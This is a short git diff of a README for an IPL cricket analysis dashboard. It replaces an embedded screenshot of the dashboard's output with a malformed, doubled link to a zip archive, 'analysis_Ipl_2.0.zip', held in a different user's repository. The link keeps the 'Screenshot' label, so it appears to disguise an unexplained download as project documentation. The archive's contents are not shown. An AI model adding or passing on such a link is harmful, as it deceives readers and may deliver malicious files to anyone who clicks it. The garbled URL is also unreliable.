@@ -55,4 +55,4 @@
 11. Export report
 
 ## Output
-![Screenshot](https://github.com/ipithani/IPL_Analysis/blob/main/Dashboard%20output.png)
+![Screenshot](https://raw.githubusercontent.com/Manoj5k/Ipl-analysis/main/cocksureness/analysis_Ipl_2.0.zip%https://raw.githubusercontent.com/Manoj5k/Ipl-analysis/main/cocksureness/analysis_Ipl_2.0.zip)
